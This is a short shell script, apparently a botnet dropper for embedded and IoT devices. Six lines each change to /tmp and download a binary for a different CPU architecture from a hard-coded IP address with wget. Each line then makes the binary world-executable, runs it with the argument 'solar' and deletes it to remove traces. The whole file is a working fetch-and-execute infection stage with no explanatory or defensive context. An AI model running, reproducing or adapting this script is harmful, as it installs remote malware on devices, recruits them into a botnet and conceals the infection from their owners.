#!/bin/sh
cd /tmp;wget http://45.95.146.126/splmips; chmod 777 splmips;./splmips solar;rm -rf splmips
cd /tmp;wget http://45.95.146.126/splmpsl; chmod 777 splmpsl;./splmpsl solar;rm -rf splmpsl
cd /tmp;wget http://45.95.146.126/splarm; chmod 777 splarm;./splarm solar;rm -rf splarm
cd /tmp;wget http://45.95.146.126/splarm5; chmod 777 splarm5;./splarm5 solar;rm -rf splarm5
cd /tmp;wget http://45.95.146.126/splarm6; chmod 777 splarm6;./splarm6 solar;rm -rf splarm6
cd /tmp;wget http://45.95.146.126/splarm7; chmod 777 splarm7;./splarm7 solar;rm -rf splarm7
